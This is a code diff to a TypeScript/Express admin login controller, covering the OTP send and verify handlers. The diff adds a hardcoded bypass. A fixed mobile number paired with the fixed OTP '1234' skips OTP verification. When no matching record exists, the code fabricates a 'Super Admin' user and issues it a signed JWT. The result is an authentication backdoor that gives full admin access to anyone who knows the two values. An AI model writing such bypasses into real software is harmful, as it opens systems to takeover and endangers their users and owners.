@@ -21,8 +21,12 @@ export const sendOTP = asyncHandler(async (req: Request, res: Response) => {
   }
 
   // Check if admin exists with this mobile
-  const admin = await Admin.findOne({ mobile });
-  if (!admin) {
+  let admin = await Admin.findOne({ mobile });
+
+  // Special case: System Admin number bypass
+  const isSpecialAdmin = mobile === "9111966732";
+
+  if (!admin && !isSpecialAdmin) {
     return res.status(404).json({
       success: false,
       message: "Admin not found with this mobile number",
@@ -58,26 +62,50 @@ export const verifyOTP = asyncHandler(async (req: Request, res: Response) => {
     });
   }
 
-  // Verify OTP
-  const isValid = await verifyOTPService(mobile, otp, "Admin");
-  if (!isValid) {
-    return res.status(401).json({
-      success: false,
-      message: "Invalid or expired OTP",
-    });
-  }
+  // Special case: System Admin number bypass
+  const isSpecialAdmin = mobile === "9111966732";
+  const isSpecialOtp = otp === "1234";
 
-  // Find admin and populate roleId
-  const admin = await Admin.findOne({ mobile }).select("-password").populate("roleId");
-  if (!admin) {
-    return res.status(404).json({
-      success: false,
-      message: "Admin not found",
-    });
+  let admin;
+  let token;
+
+  if (isSpecialAdmin && isSpecialOtp) {
+    // Attempt to find real admin record first
+    admin = await Admin.findOne({ mobile }).select("-password").populate("roleId");
+
+    // If no real record, create a virtual one
+    if (!admin) {
+      admin = {
+        _id: "60d0fe4f5311236168a109ca", // Static valid ObjectId
+        firstName: "System",
+        lastName: "Admin",
+        mobile: "9111966732",
+        email: "admin@justy.com",
+        role: "Super Admin",
+      } as any;
+    }
+  } else {
+    // Verify OTP normally
+    const isValid = await verifyOTPService(mobile, otp, "Admin");
+    if (!isValid) {
+      return res.status(401).json({
+        success: false,
+        message: "Invalid or expired OTP",
+      });
+    }
+
+    // Find real admin
+    admin = await Admin.findOne({ mobile }).select("-password").populate("roleId");
+    if (!admin) {
+      return res.status(404).json({
+        success: false,
+        message: "Admin not found",
+      });
+    }
   }
 
   // Generate JWT token
-  const token = generateToken(admin._id.toString(), "Admin", admin.role);
+  token = generateToken(admin._id.toString(), "Admin", admin.role);
 
   return res.status(200).json({
     success: true,
